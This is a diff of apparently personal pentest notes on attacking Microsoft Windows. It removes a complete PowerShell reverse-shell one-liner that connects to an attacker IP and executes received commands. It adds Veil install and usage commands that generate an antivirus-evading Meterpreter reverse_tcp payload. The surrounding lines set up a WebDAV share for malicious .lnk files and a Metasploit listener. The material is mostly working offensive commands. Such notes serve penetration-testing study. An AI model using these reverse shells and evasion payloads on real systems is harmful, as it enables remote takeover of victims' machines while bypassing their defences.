@@ -1,48 +1,5 @@
 # Microsoft Windows attacks
 
-## Reminders
-
-### Cmd
-
-```
-forfiles /P C:\Windows /S /M *.txt /c "cmd /c echo @PATH"
-find /c /v "" file.txt
-net user
-net localgroup
-```
-
-### Powershell
-
-#### Basics
-
-Get help:
-```
-Get-Help somecommand
-Get-Command -ParameterName ComputerName
-Get-Command -name "*name*"
-```
-
-Find file:
-```
-Get-ChildItem -Path C:\ -Include *.extension -File -Recurse -ErrorAction SilentlyContinue
-```
-
-Base64: https://stackoverflow.com/questions/15414678/how-to-decode-a-base64-string
-```
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("somebase64string"))
-[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("sometext"))
-```
-
-#### Powershell reverse shell one-liner
-
-- source: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
-- command:
-```
-$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-```
-- base64: https://github.com/darkoperator/powershell_scripts/blob/master/README
-
-
 ## WebDAV shares
 
 To share malicious Library or .lnk files:
@@ -52,7 +9,17 @@ kali$ mkdir mywebdav # share visible on Windows Explorer
 kali$ /path/to/wsgidav --host=0.0.0.0 --auth=anonymous --port $AttackerPort --root ./mywebdav
 ```
 
-## AV evasion
+Library files: 
+- https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry
+- https://github.com/ThomasBucaioni/pentools/blob/main/microsoft/config.Library-ms
+
+Link `.lnk` files: https://learn.microsoft.com/en-us/windows/win32/shell/links 
+
+## Anti-Virus evasion
+
+Modern viruses:
+- https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/
+- https://web.archive.org/web/20210317102554/https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf
 
 ### Powershell memory injection
 
@@ -121,5 +88,21 @@ Metasploit listener:
 kali$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $AttackerIP;set LPORT $AttackerPort;run;"
 ```
 
+### Veil
 
+Install:
+```
+apt -y install veil
+/usr/share/veil/config/setup.sh --force --silent
+```
+
+Issue: https://github.com/Veil-Framework/Veil/issues/428
+```
+sudo -u "${trueuser}" WINEPREFIX="${winedir}" wine "${winedir}/drive_c/Python34/python.exe" "-m" "pip" "install" "-Iv" "pefile==2019.4.18"
+```
+
+Usage:
+```
+kali$ veil -e Evasion -p powershell/meterpreter/rev_tcp --msfpayload windows/meterpreter/reverse_tcp --msfoptions LHOST=$AttackerIp LPORT=$AttackerPort
+```
 
